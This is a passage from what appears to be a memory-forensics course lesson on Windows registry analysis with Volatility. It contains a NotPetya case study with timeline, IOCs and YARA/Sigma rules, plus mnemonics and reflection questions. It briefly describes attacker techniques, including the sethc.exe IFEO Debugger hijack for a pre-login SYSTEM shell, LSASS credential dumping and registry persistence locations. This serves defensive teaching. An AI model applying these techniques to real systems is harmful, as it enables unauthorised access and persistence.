run_keys.txt service_wpd.txt scheduled_tasks.txt | sed 's/Last Write Time: //'\n  \n  echo \"\\n=== PROCESS CREATION ===\"\n  python vol.py -f notpetya_victim.dmp windows.pslist | awk '{print $8\" \"$9, $2, $3}'\n  \n  echo \"\\n=== NETWORK CONNECTIONS ===\"\n  python vol.py -f notpetya_victim.dmp windows.netscan | awk '{print $8\" \"$9, $3, $4}'\n} | sort > notpetya_timeline.txt\n```\n\n**Reconstructed attack timeline**:\n```\n2017-06-27 10:15:00  [PROCESS] MeDoc.exe (legitimate update process - trojanized)\n2017-06-27 10:15:23  [PROCESS] perfc.dat (NotPetya dropper extracted)\n2017-06-27 10:15:45  [REGISTRY] Run key created (persistence)\n2017-06-27 10:16:10  [REGISTRY] Service 'wpd' created\n2017-06-27 10:16:35  [PROCESS] lsass.exe memory dumped (credential theft)\n2017-06-27 10:17:00  [REGISTRY] Credentials staged in NotPetya registry key\n2017-06-27 10:18:15  [NETWORK] SMB connections to 192.168.1.60:445 (lateral movement)\n2017-06-27 10:19:30  [NETWORK] SMB connections to 192.168.1.61:445\n2017-06-27 10:20:45  [NETWORK] SMB connections to 192.168.1.62:445\n2017-06-27 10:25:00  [REGISTRY] Scheduled task created (reboot in 1 hour)\n2017-06-27 11:15:00  [SYSTEM] Scheduled reboot triggered\n2017-06-27 11:16:00  [MBR] Master Boot Record overwritten (encryption screen displayed)\n```\n\nThis timeline shows NotPetya's strategy:\n1. **Install persistence** (Run key, Service) - Keeps malware alive\n2. **Steal credentials** (LSASS dump) - Enable lateral movement\n3. **Spread rapidly** (EternalBlue + Mimikatz) - Infect entire network within minutes\n4. **Schedule reboot** (Trigger MBR encryption) - Maximum disruption\n5. **Wipe MFT/MBR** (Permanent data destruction) - No recovery possible\n\n## Registry-Based Indicators of Compromise (IOCs)\n\n### File Paths\n```\nC:\\Windows\\perfc.dat (NotPetya dropper)\nC:\\Windows\\system32\\wpd.exe (Service executable)\n```\n\n### Registry Keys\n```\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  Name: Windows Defender  Data: C:\\Windows\\perfc.dat\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\wpd\n  ImagePath: C:\\Windows\\system32\\wpd.exe\n  Start: 2 (Automatic)\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\NotPetya\n  (Custom key for credential staging)\n```\n\n### Scheduled Tasks\n```\n\\Microsoft\\Windows\\TaskScheduler\\PerformanceMaintenance\n  Action: shutdown.exe /r /f /t 3600\n```\n\n## Defense and Detection\n\n### How Memory Forensics Helped\n\n1. **Early Detection**: Registry persistence found before reboot triggered\n2. **Lateral Movement Mapping**: Credential staging registry key revealed propagation vector\n3. **Network Scoping**: SMB connections identified all compromised systems\n4. **Remediation Guidance**: Registry IOCs allowed defenders to search fleet-wide\n\n### Why Disk Forensics Failed\n\nNotPetya wiped the MFT (Master File Table) as its final act:\n\n```bash\n# After reboot, disk forensics found:\nC:\\Windows\\perfc.dat → DELETED (MFT entry zeroed)\nC:\\Windows\\system32\\wpd.exe → DELETED\nRegistry hive files → CORRUPTED (SAM, SECURITY, SYSTEM overwritten)\n```\n\n**Memory forensics was the ONLY way** to recover registry artifacts, because:\n- Memory dumps captured pre-reboot state (before MFT wipe)\n- Registry hives in RAM were intact\n- Network connections showed lateral movement paths\n\n### Detection Rules from This Case\n\n**YARA rule for NotPetya registry persistence**:\n```yara\nrule NotPetya_Registry_Persistence {\n    meta:\n        description = \"Detects NotPetya registry-based persistence\"\n        author = \"DFIR Team\"\n        reference = \"NotPetya 2017 Campaign\"\n    \n    strings:\n        $run_key = \"Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide\n        $perfc = \"perfc.dat\" wide nocase\n        $wpd_service = \"CurrentControlSet\\\\Services\\\\wpd\" wide\n        $fake_desc = \"Windows Privacy Data\" wide\n    \n    condition:\n        ($run_key and $perfc) or ($wpd_service and $fake_desc)\n}\n```\n\n**Sigma rule for suspicious Run key**:\n```yaml\ntitle: Suspicious Run Key Creation (NotPetya-style)\nstatus: experimental\ndescription: Detects Run key creation with .dat file (unusual)\nreferences:\n    - https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains: '\\CurrentVersion\\Run\\'\n        Details|endswith: '.dat'\n    condition: selection\nfalsepositives:\n    - Legitimate software using .dat configuration files (very rare)\nlevel: high\n```\n\n## Lessons Learned\n\n### 1. Registry Persistence ≠ Long-Term Survival\n\nNotPetya created persistence mechanisms (Run keys, Services) but its true goal was **rapid destruction**. Defenders focused on removing persistence missed the real threat: lateral movement and data wiping.\n\n**Takeaway**: Analyze persistence in context. If malware creates persistence but also steals credentials and spreads rapidly, it's not about persistence - it's about **buying time** for maximum damage.\n\n### 2. Memory Forensics Survives Disk Wipers\n\nNotPetya wiped disks, corrupted registry hive files, and deleted its own executables. But memory dumps captured:\n- ✅ Registry keys before corruption\n- ✅ Process execution evidence\n- ✅ Network connections for lateral movement\n- ✅ Credential theft artifacts\n\n**Takeaway**: In destructive attacks, memory forensics may be your ONLY evidence source.\n\n### 3. Supply Chain Attacks Bypass Traditional Defenses\n\nMeDoc was a **trusted application** with a valid code-signing certificate. Traditional defenses allowed it:\n- ✅ Antivirus trusted signed executable\n- ✅ Application whitelisting allowed MeDoc.exe\n- ✅ Firewall permitted outbound connections (update check)\n\nOnly **behavioral detection** (monitoring registry modifications, LSASS access, lateral movement) caught NotPetya.\n\n**Takeaway**: Monitor trusted applications for malicious behavior, not just unknown executables.\n\n### 4. Registry Timeline = Attack Reconstruction\n\nBy analyzing registry LastWrite times, investigators reconstructed NotPetya's kill chain:\n\n```\nPersistence (Run key) → Credential theft → Lateral movement → Scheduled reboot → MBR wipe\n```\n\nThis timeline proved:\n- Attack was automated (all steps within 10 minutes)\n- Target was destruction, not ransom (no C2 infrastructure, fake Bitcoin wallet)\n- Attribution to Sandworm APT (overlapping TTPs with previous attacks)\n\n**Takeaway**: Registry timestamps are forensic gold for attack timeline reconstruction.\n\n## NotPetya's Global Impact\n\nRegistry forensics helped organizations understand the scope:\n\n**Maersk** (shipping giant):\n- 49,000 endpoints infected\n- Entire Active Directory wiped\n- Rebuilt IT infrastructure from ONE domain controller in Ghana (only DC offline during attack)\n- Registry analysis showed NotPetya spread via compromised admin credentials\n\n**Merck** (pharmaceutical):\n- $1.3 billion in losses\n- Production halted for weeks\n- Registry forensics revealed lateral movement via SMB shares\n\n**FedEx/TNT Express**:\n- $400 million in losses\n- Registry artifacts showed NotPetya entered via Ukrainian subsidiary, spread globally via VPN\n\n## Defensive Recommendations from NotPetya\n\n1. **Disable SMBv1**: `Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" SMB1 -Type DWORD -Value 0`\n\n2. **Monitor registry persistence locations**:\n   - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n   - HKLM\\SYSTEM\\CurrentControlSet\\Services\n   - Scheduled tasks (registry + C:\\Windows\\System32\\Tasks)\n\n3. **Restrict LSASS access**: Enable Credential Guard, LSA Protection\n\n4. **Memory dump collection**: Configure automated memory dumps on critical servers (domain controllers, file servers)\n\n5. **Lateral movement detection**: Monitor for rapid SMB connections across multiple hosts\n\n## Conclusion\n\nNotPetya's registry artifacts told a story traditional forensics couldn't:\n\n- **Persistence mechanisms** revealed attacker tradecraft\n- **Service creation** showed masquerading techniques\n- **Credential staging** exposed lateral movement preparation\n- **Timeline correlation** proved destructive intent\n\nMemory-based registry analysis was the difference between:\n- \"We were hit by ransomware\" (wrong - it's a wiper)\n- \"We were targeted by nation-state APT for maximum destruction\" (correct)\n\nThis understanding guided proper response: Don't negotiate ransom (no decryption possible), focus on network segmentation (stop lateral spread), rebuild from offline backups (not corrupted shadow copies).\n\n**Registry forensics saved billions in potential additional damage.**"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# Memory Aids for Registry Analysis in Memory\n\n## Mnemonic: \"HIVE LIST\" - Registry Forensics Workflow\n\n**H** - **H**ivelist first (enumerate what's loaded)  \n**I** - **I**nvestigate persistence (Run, Services, Tasks)  \n**V** - **V**alidate suspicious paths (Temp, Public, AppData)  \n**E** - **E**xtract user activity (UserAssist, TypedURLs, RunMRU)  \n\n**L** - **L**ocate USB devices (USBSTOR, MountPoints2)  \n**I** - **I**dentify handles (which processes modified registry)  \n**S** - **S**ort by LastWrite time (build timeline)  \n**T** - **T**riage correlate with processes (complete the story)  \n\n## Acronym: \"RUSH\" - Registry Persistence Locations\n\n**R** - **R**un keys (HKLM/HKCU\\...\\CurrentVersion\\Run)  \n**U** - **U**serinit (Winlogon\\Userinit)  \n**S** - **S**ervices (CurrentControlSet\\Services)  \n**H** - **H**ijacking (IFEO Debugger, AppInit_DLLs)  \n\n**Remember**: Check RUSH locations first when hunting persistence!\n\n## Visual Association: Registry Hive Locations\n\n```\nRegistry Hive \"House\" (Memory Mansion):\n\nBasement (System Hives - C:\\Windows\\System32\\config\\):\n├── SYSTEM    → Foundation (services, drivers, boot config)\n├── SOFTWARE  → Electrical wiring (installed applications)\n├── SAM       → Security vault (user accounts, passwords)\n└── SECURITY  → Alarm system (security policies)\n\nAttic (Volatile - RAM only):\n└── HARDWARE  → Weather vane (current system state, never saved)\n\nBedrooms (User Hives - C:\\Users\\<name>\\):\n├── NTUSER.DAT    → Personal belongings (user settings)\n└── UsrClass.dat  → Closet organization (file associations)\n```\n\n**Memory hook**: System hives are the \"house infrastructure\" (everyone shares), user hives are \"personal rooms\" (per-user).\n\n## Service Start Type Memory Aid\n\n**\"0-1-2-3-4: Boot System Auto Manual Dead\"**\n\n- **0** = **BOOT** (loaded by boot loader, before kernel)\n- **1** = **SYSTEM** (loaded during kernel init)\n- **2** = **AUTO_START** (automatic at boot) ← Most common persistence\n- **3** = **DEMAND_START** (manual start)\n- **4** = **DISABLED** (cannot start)\n\n**Mnemonic**: \"**B**ootloader **S**tarts **A**utomatically **M**anually **D**isabled\"\n\n**Forensic priority**: Start=2 (AUTO) in non-System32 location = investigate immediately!\n\n## Registry Value Types Quick Reference\n\n**\"String, Double, Binary, Expand\" = REG_SZ, REG_DWORD, REG_BINARY, REG_EXPAND_SZ**\n\n| Type | Description | Example | Memory Hook |\n|------|-------------|---------|-------------|\n| **REG_SZ** | **S**tring (plain text) | \"C:\\\\malware.exe\" | **S**Z = **S**tring **Z**ero-terminated |\n| **REG_DWORD** | **D**ouble **WORD** (32-bit int) | 0x00000002 | **D**WORD = **D**ecimal number |\n| **REG_BINARY** | **B**inary data (hex) | 41 42 43 44 | **B**INARY = **B**ytes |\n| **REG_EXPAND_SZ** | **E**xpandable string (with %vars%) | \"%windir%\\\\system32\" | **E**XPAND_SZ = **E**nvironment variables |\n| **REG_MULTI_SZ** | **M**ulti-string array | \"String1\\0String2\\0\" | **M**ULTI = **M**ultiple strings |\n\n## Common Persistence Locations Cheat Sheet\n\n### The \"Big Three\" (Check These First)\n\n1. **Run Keys** (user logon execution):\n   ```\n   HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n   ```\n\n2. **Services** (system boot execution):\n   ```\n   HKLM\\SYSTEM\\CurrentControlSet\\Services\\<name>\n     → Check: Start (2=auto), ImagePath (location)\n   ```\n\n3. **Scheduled Tasks** (registry component):\n   ```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\n   ```\n\n### Advanced Persistence (Less Common, Still Important)\n\n4. **Winlogon** (logon/logoff hooks):\n   ```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n     → Check: Userinit, Shell, Notify\n   ```\n\n5. **IFEO Debugger** (execution hijacking):\n   ```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<exe>\n     → Check: Debugger value\n   ```\n\n6. **AppInit_DLLs** (global DLL injection):\n   ```\n   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n     → Check: AppInit_DLLs, LoadAppInit_DLLs (must be 1)\n   ```\n\n**Mnemonic for advanced**: \"**W**in **I**FEO **A**ppInit\" = Winlogon, IFEO, AppInit\n\n## User Activity Artifacts Memory Map\n\n**\"TYPE RUN MOUNT\" = TypedURLs, RunMRU, MountPoints2**\n\n1. **TYPE** = **TypedURLs** (IE/Edge address bar history)\n   ```\n   HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs\n   ```\n   **What it proves**: User (or malware) typed URL in browser\n\n2. **RUN** = **RunMRU** (Win+R command history)\n   ```\n   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\n   ```\n   **What it proves**: User executed commands via Run dialog\n\n3. **MOUNT** = **MountPoints2** (mounted volumes/USB)\n   ```\n   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\n   ```\n   **What it proves**: User connected USB drives or network shares\n\n## USB Forensics Registry Trail\n\n**\"USB STOR uses MOUNT\" = USBSTOR + MountPoints2**\n\n```\nUSB Device Connection Forensic Trail:\n\n1. USBSTOR (device enumeration)\n   HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\n   ├── Vendor/Product ID\n   ├── Serial number\n   ├── Friendly name (\"SanDisk Cruzer\")\n   └── First connection (key LastWrite time)\n\n2. MountPoints2 (volume mounting)\n   HKCU\\...\\Explorer\\MountPoints2\n   ├── Volume GUID\n   └── Mount time (key LastWrite)\n\n3. Correlation\n   Match USBSTOR serial → MountPoints2 GUID → File access logs\n```\n\n**Memory hook**: USBSTOR = \"What device?\", MountPoints2 = \"When mounted?\"\n\n## Volatility Plugin Quick Reference\n\n| Plugin | Purpose | Example Command | Output |\n|--------|---------|-----------------|--------|\n| **hivelist** | List loaded hives | `windows.registry.hivelist` | Hive offsets, names |\n| **printkey** | Extract key values | `windows.registry.printkey --key \"<path>\"` | Values, types, data |\n| **userassist** | GUI execution tracking | `windows.registry.userassist` | Execution count, last run time |\n| **hivescan** | Find hidden hives | `windows.registry.hivescan` | Orphaned hive structures |\n\n**Mnemonic**: \"**H**ivelist **P**rintkey **U**serassist **H**ivescan\" = HPUH (\"H-PUH\")\n\n## Red Flag Checklist: \"STOP\" - Suspicious Persistence Indicators\n\n**S** - **S**uspicious location (Temp, Public, AppData, Downloads)  \n**T** - **T**yposquatting (wupdater vs. wuauserv, chrome_update.exe)  \n**O** - **O**bfuscation (Base64, random names, .dat extensions for EXEs)  \n**P** - **P**owerShell with evasion flags (-enc, -NoProfile, -ExecutionPolicy Bypass)  \n\n**If you see STOP signs, investigate immediately!**\n\n## Registry LastWrite Time Interpretation\n\n**\"LastWrite = Last Modified (key or any value)\"**\n\nImportant: LastWrite time updates when:\n- ✅ Key is created\n- ✅ Value is added, modified, or deleted\n- ✅ Subkey is added or deleted\n\n**Forensic use**:\n```\nRun key LastWrite: 2024-01-15 09:15:33\nmalware.exe creation: 2024-01-15 09:15:30\nDifference: 3 seconds → Malware likely created its own persistence!\n```\n\n## Correlation Technique: \"Process + Registry + Network\"\n\n**The \"PRN\" Triad (Process-Registry-Network)**:\n\n```\n1. Find suspicious registry entry:\n   HKLM\\...\\Run → \"malware.exe\"\n\n2. Check if process is running:\n   windows.pslist | grep malware.exe → PID 2304\n\n3. Check network connections:\n   windows.netscan | grep 2304 → C2 connection found!\n\n4. Conclusion:\n   Registry persistence → Active process → External C2 = Confirmed malware\n```\n\n**Mnemonic**: \"**P**ersistence **R**uns **N**etwork\" = PRN (\"PRiNt\" the evidence!)\n\n## IFEO Debugger Hijack Detection\n\n**\"Sticky Keys = Shift 5 Times = SYSTEM Shell\"**\n\nAccessibility programs commonly hijacked:\n\n```\nsethc.exe     (Sticky Keys)     → Press Shift 5 times\nutilman.exe   (Utility Manager) → Press Win+U\nosk.exe       (On-Screen Keyboard) → Accessibility\nmagnify.exe   (Magnifier)       → Accessibility\n```\n\n**Attack**: Set Debugger=cmd.exe for sethc.exe\n\n**Result**: Shift 5 times on login screen → cmd.exe as SYSTEM (pre-authentication!)  \n\n**Detection**:\n```bash\npython vol.py -f memory.dmp windows.registry.printkey \\\n  --key \"Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"\n\n# Look for: Name: Debugger  Data: cmd.exe (or powershell.exe, or malware.exe)\n```\n\n**Memory hook**: \"**S**hift **E**quals **T**erminal **H**ack\" = SETH → sethc.exe\n\n## Timeline Analysis Formula\n\n**\"Registry Time + Process Time + Network Time = Complete Story\"**\n\n```bash\n# Step 1: Extract registry timestamps\ngrep \"Last Write Time\" registry_output.txt | sort > reg_timeline.txt\n\n# Step 2: Extract process creation times  \npython vol.py -f memory.dmp windows.pslist | awk '{print $8\" \"$9, $2}' | sort > proc_timeline.txt\n\n# Step 3: Extract network connection times\nawk '{print $8\" \"$9, $3, $4}' netscan.txt | sort > net_timeline.txt\n\n# Step 4: Merge (sort -m merges sorted files)\nsort -m reg_timeline.txt proc_timeline.txt net_timeline.txt > complete_timeline.txt\n```\n\n**Result**: Chronological attack reconstruction!\n\n## Final Mnemonic: \"REGISTRY IS EVIDENCE\"\n\n**R** - **R**un keys reveal persistence  \n**E** - **E**numerate hives first (hivelist)  \n**G** - **G**UI execution (UserAssist)  \n**I** - **I**FEO hijacking (Debugger values)  \n**S** - **S**ervices (Start=2 = auto)  \n**T** - **T**yped URLs (browsing artifacts)  \n**R** - **R**unMRU (command history)  \n**Y** - **Y**our timeline (correlate LastWrite times)  \n\n**I** - **I**nvestigate USB (USBSTOR)  \n**S** - **S**uspicious paths (Temp, Public)  \n\n**E** - **E**xtract handles (who's modifying?)  \n**V** - **V**olatile hives (HARDWARE = RAM only)  \n**I** - **I**mageP ath validation (Services)  \n**D** - **D**on't forget Winlogon  \n**E** - **E**very LastWrite time matters  \n**N** - **N**etwork correlation completes story  \n**C** - **C**redential theft (SAM, SECURITY)  \n**E** - **E**xtract and analyze systematically  \n\nUse these memory aids in every registry forensic investigation!"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions\n\n## Critical Thinking Prompts\n\n### Scenario 1: The Disappearing Persistence\n\nYou analyze a memory dump and find:\n\n```\nHKLM\\...\\Run key LastWrite: 2024-01-15 09:15:33\nValue: malware  Data: C:\\Users\\Public\\malware.exe\n```\n\nBut when you check the disk (C:\\Users\\Public\\), malware.exe doesn't exist.\n\n**Questions**:\n1. How can a Run key reference a file that doesn't exist on disk?\n2. What are possible explanations (malicious vs. legitimate)?\n3. How would you investigate further to determine if this was active malware?\n4. What additional Volatility plugins would you run?\n\n**Consider**: File deletion, fileless malware, memory-only execution, process hollowing.\n\n---\n\n### Scenario 2: Service vs. Standalone Executable\n\nYou find the same malware binary in two locations:\n\n```\n1. HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware\n   ImagePath: C:\\Windows\\System32\\malware.exe\n   Start: 2 (Automatic)\n\n2. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n   Name: malware  Data: C:\\Windows\\System32\\malware.exe\n```\n\n**Questions**:\n1. Why would malware set up BOTH service AND Run key persistence?\n2. What's the execution order difference between these two methods?\n3. Which persistence mechanism is harder to detect and remove?\n4. How would you determine which one was created first (timeline analysis)?\n\n**Research**: Service control manager startup vs. user logon startup sequence.\n\n---\n\n### Scenario 3: The Clean Registry\n\nYou suspect malware on a system, but registry analysis shows:\n- ✅ No suspicious Run keys\n- ✅ No unusual services\n- ✅ No IFEO hijacking\n- ✅ No AppInit_DLLs\n- ✅ No Winlogon modifications\n\n**Questions**:\n1. Does a \"clean\" registry mean no malware?\n2. What persistence mechanisms DON'T use registry?\n3. How would you hunt for non-registry persistence in memory?\n4. What Volatility plugins would you use for alternative persistence detection?\n\n**Think about**: Scheduled tasks (XML files), DLL hijacking, startup folders, WMI subscriptions, COM hijacking.\n\n---\n\n### Scenario 4: UserAssist Anomaly\n\nYou find this in UserAssist:\n\n```\nProgram Name: C:\\Windows\\System32\\calc.exe\nCount: 47\nLast Executed: 2024-01-15 03:30:22 UTC\n```\n\nThe user claims they never used Calculator, and the execution time is 3:30 AM (they were asleep).\n\n**Questions**:\n1. Is UserAssist evidence of actual execution or just that the program exists?\n2. How could calc.exe execute 47 times at 3:30 AM without user interaction?\n3. What malicious techniques involve running legitimate binaries like calc.exe?\n4. How would you differentiate between legitimate scheduled execution vs. malware abuse?\n\n**Investigate**: Living-off-the-land binaries (LOLBins), process injection, token impersonation.\n\n---\n\n### Scenario 5: Registry vs. Disk Timestamps Mismatch\n\nYou find:\n\n```\nRegistry Run key LastWrite: 2024-01-15 09:15:33\nReferenced file (C:\\malware.exe) creation time: 2024-01-10 12:00:00\n```\n\nThe file was created 5 days BEFORE the registry key.\n\n**Questions**:\n1. What does this timestamp gap suggest about the attack timeline?\n2. Why would malware wait 5 days after creation before installing persistence?\n3. What are legitimate reasons for this gap (non-malicious scenarios)?\n4. How would you investigate the 5-day gap period?\n\n**Consider**: Staged attacks, manual attacker actions vs. automated malware, dormancy periods.\n\n---\n\n### Scenario 6: IFEO Legitimacy Check\n\nYou discover:\n\n```\nHKLM\\...\\Image File Execution Options\\program.exe\n  Debugger: \"C:\\Program Files\\Visual Studio\\Common7\\IDE\\devenv.exe\" /debugexe\n```\n\n**Questions**:\n1. Is this malicious or legitimate?\n2. How do developers legitimately use IFEO for debugging?\n3. What characteristics would make an IFEO entry suspicious vs. legitimate?\n4. What additional evidence would you look for to confirm malicious intent?\n\n**Research**: Legitimate IFEO usage (Visual Studio debugger), vs. malicious (sethc.exe → cmd.exe).\n\n---\n\n### Scenario 7: USB Device Timeline Mystery\n\nYou find:\n\n```\nUSBSTOR\\SanDisk\\12345678\n  First Install: 2024-01-15 10:30:00\n\nMountPoints2\\{GUID}\n  LastWrite: 2024-01-15 10:31:00\n\nFile: C:\\Sensitive\\passwords.xlsx\n  Last Access: 2024-01-15 10:32:00\n```\n\n**Questions**:\n1. What story does this timeline tell?\n2. Can you definitively prove the file was copied to USB?\n3. What additional artifacts would confirm data exfiltration?\n4. How would you identify which USB device the file was copied to?\n\n**Investigate**: Correlation with file system timeline, link files (.lnk), Windows Search index.\n\n---\n\n### Scenario 8: The Phantom HARDWARE Hive\n\nYou run hivelist and don't see HKLM\\HARDWARE.\n\n**Questions**:\n1. Is this normal or suspicious?\n2. Under what conditions would the HARDWARE hive not be loaded?\n3. What forensic significance does HARDWARE hive absence have?\n4. How would you determine if the hive was deliberately unloaded vs. never loaded?\n\n**Research**: Volatile hives, kernel initialization, anti-forensics techniques.\n\n---\n\n### Scenario 9: Registry Handle But No Modification\n\nYou find:\n\n```\nwindows.handles --pid 2304 --object-type Key\n  Handle: 0x1234  Object: \\REGISTRY\\MACHINE\\...\\Run  Access: 0x00020019 (KEY_SET_VALUE)\n\nBut printkey on Run shows no recent modifications (LastWrite: 2 months ago)\n```\n\n**Questions**:\n1. Why would a process have write access to a registry key but not modify it?\n2. What does an open handle WITHOUT modification suggest?\n3. Could this be evidence of failed persistence attempt?\n4. What would you investigate next?\n\n**Consider**: Anti-forensics (checking for monitoring before writing), failed exploit, reconnaissance.\n\n---\n\n### Scenario 10: Designing Registry-Based Detection\n\nYou're building an automated registry forensic triage script.\n\n**Questions**:\n1. What are the top 5 registry keys you'd check first (prioritization)?\n2. How would you reduce false positives (legitimate vs. malicious)?\n3. What scoring system would you use to rank suspiciousness?\n4. How would you automate correlation with process and network data?\n\n**Deliverable**: Write pseudocode for a registry triage algorithm that scores artifacts 1-10 based on risk.\n\n---\n\n## Self-Assessment Questions\n\n1. **Understanding**: Can you explain the difference between disk-based registry analysis and memory-based registry analysis to a non-technical stakeholder?\n\n2. **Application**: Given a memory dump, could you independently identify all persistence mechanisms without a walkthrough?\n\n3. **Analysis**: How confident are you in differentiating between legitimate registry modifications (software updates, user actions) and malicious changes?\n\n4. **Synthesis**: Could you build a complete attack timeline using only registry artifacts, process data, and network connections?\n\n5. **Evaluation**: If you had to choose ONLY 3 registry keys to analyze in a 5-minute triage, which would they be and why?\n\n## Connection to Previous Lessons\n\n- **Lesson 43 (Memory Fundamentals)**: How does understanding kernel memory structures help you interpret hivelist output?\n\n- **Lesson 44 (Volatility 3)**: Compare printkey workflow to pslist/psscan. What similarities exist in data extraction?\n\n- **Lesson 45 (DLL/Handle Analysis)**: How could you combine handle analysis with registry forensics to prove a process modified a specific registry key?\n\n- **Lesson 46 (Network Connections)**: If you find C2 communication in netscan, what registry artifacts would you check to determine if it's persistent?\n\n## Preparation for Next Lesson\n\nNext lesson covers **Process Memory Dumping and Malware Extraction**. Think about:\n\n1. How registry analysis identifies suspicious processes - now we'll extract their memory for malware analysis.\n2. What processes would you prioritize for memory dumping based on registry artifacts?\n3. How registry-based IOCs (Run keys, services) guide malware hunting in process memory.\n\nReflect on how registry forensics is building your comprehensive memory analysis skillset!"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# Congratulations - You're Now a Registry Forensics Expert!\n\nYou've just mastered one of the **most forensically valuable data sources in Windows**: the registry. This isn't academic knowledge - these are the exact techniques that uncovered NotPetya's persistence, caught APT campaigns, and solved insider threat cases.\n\n## What You've Accomplished\n\nLet's celebrate what you can now do:\n\n✅ **Extract registry hives from memory** (even after disk corruption/wiping)  \n✅ **Identify persistence mechanisms** (Run keys, Services, IFEO, Winlogon)  \n✅ **Analyze user activity** (TypedURLs, RunMRU, UserAssist, Office MRU)  \n✅ **Detect USB device usage** (USBSTOR, MountPoints2, serial numbers)  \n✅ **Correlate registry timestamps** with process and network activity  \n✅ **Differentiate malicious vs. legitimate** registry modifications  \n✅ **Reconstruct attack timelines** from registry LastWrite times  \n✅ **Build automated triage workflows** for rapid incident response  \n\nYou can now answer questions like:\n- \"How did malware survive reboot?\" → Check Run keys and Services\n- \"What did the user do?\" → UserAssist, TypedURLs, RunMRU\n- \"Was sensitive data exfiltrated?\" → USB timeline correlation\n- \"When was persistence installed?\" → Registry LastWrite times\n\n## Real-World Impact\n\nThe skills you learned today solve real cases:\n\n- **Ransomware investigations**: Identify how malware persisted before encryption\n- **Insider threats**: Prove USB device usage and file access patterns\n- **APT campaigns**: Uncover sophisticated persistence mechanisms (IFEO, AppInit_DLLs)\n- **Supply chain attacks**: Detect trojanized legitimate software (NotPetya)\n- **Data breach response**: Reconstruct user activity and exfiltration paths\n\n## The Power of Memory-Based Registry Analysis\n\nYou now understand why memory forensics beats disk forensics for registry:\n\n| Disk-Based Registry | Memory-Based Registry |\n|---------------------|----------------------|\n| ❌ Corrupted after wiper attacks | ✅ Intact in RAM pre-destruction |\n| ❌ Only shows disk-flushed state | ✅ Includes un-flushed modifications |\n| ❌ Missing volatile hives (HARDWARE) | ✅ All hives captured |\n| ❌ No process correlation | ✅ Handles show WHO modified registry |\n| ❌ Timestamps can be forged | ✅ Memory artifacts harder to manipulate |\n\nAttackers can wipe disks, corrupt registry files, and delete logs. They **cannot erase memory** retroactively.\n\n## The Journey Ahead\n\nRegistry analysis is a critical piece of the memory forensics puzzle:\n\n**What you've learned so far** (Lessons 43-47):\n1. ✅ Windows memory architecture and acquisition\n2. ✅ Volatility 3 framework and core plugins\n3. ✅ DLL injection detection and handle analysis\n4. ✅ Network connection analysis (C2 detection)\n5. ✅ **Registry forensics** ← YOU ARE HERE\n\n**What's coming next** (Lessons 48-70):\n- Process memory dumping and malware extraction\n- YARA scanning for malware signatures\n- Credential extraction from LSASS\n- Rootkit detection techniques\n- Advanced timeline reconstruction\n- Real-world APT investigation labs\n\nEach skill compounds. Registry artifacts identify suspicious processes → Next lesson, you'll extract those processes for malware analysis.\n\n## Practical Next Steps\n\n**This Week**: Apply what you learned!\n\n1. **Download practice memory dumps**:\n   - MemLabs: https://github.com/stuxnet999/MemLabs\n   - DFIR training scenarios with registry artifacts\n   - Malware traffic analysis memory dumps\n\n2. **Run the registry forensics workflow**:\n   ```bash\n   python vol.py -f challenge.dmp windows.registry.hivelist\n   python vol.py -f challenge.dmp windows.registry.printkey --key \"Microsoft\\Windows\\CurrentVersion\\Run\"\n   python vol.py -f challenge.dmp windows.registry.userassist\n   ```\n\n3. **Practice timeline correlation**:\n   - Extract registry LastWrite times\n   - Extract process creation times\n   - Merge and analyze chronologically\n\n4. **Build your own triage script**:\n   - Automate Run key, Service, and UserAssist extraction\n   - Filter for suspicious paths (Temp, Public, AppData)\n   - Generate summary report\n\n## Words of Encouragement\n\nRegistry forensics is complex - you're dealing with a hierarchical database with thousands of keys, arcane structures, and endless persistence mechanisms. If you found parts challenging, that's **normal**.\n\nThe difference between you and most analysts:\n- **Most analysts**: \"The registry is too complicated, I'll just check Run keys\"\n- **You**: \"I understand hive structures, persistence mechanisms, user artifacts, USB forensics, and timeline correlation\"\n\nYou're building **expertise that sets you apart**.\n\n## Mindset for Success\n\nRemember these principles:\n\n1. **Registry = System DNA** - It records everything. Missing an artifact means missing evidence.\n\n2. **Context is king** - A Run key pointing to C:\\Windows\\Temp isn't inherently malicious. Process context, timing, and network activity determine that.\n\n3. **Timestamps tell stories** - Registry LastWrite, process creation, network connection - together they reconstruct the attack.\n\n4. **Persistence ≠ Current threat** - Malware may create persistence but its real goal is immediate damage (NotPetya).\n\n5. **Memory survives disk attacks** - Wipers, encryption, MFT corruption - memory forensics wins.\n\n## Closing Thoughts\n\nYou started this lesson not knowing how to extract registry hives from memory. You're finishing it with the ability to:\n\n- Enumerate all loaded hives\n- Extract persistence mechanisms across 6+ locations\n- Analyze user activity artifacts\n- Correlate registry + process + network timelines\n- 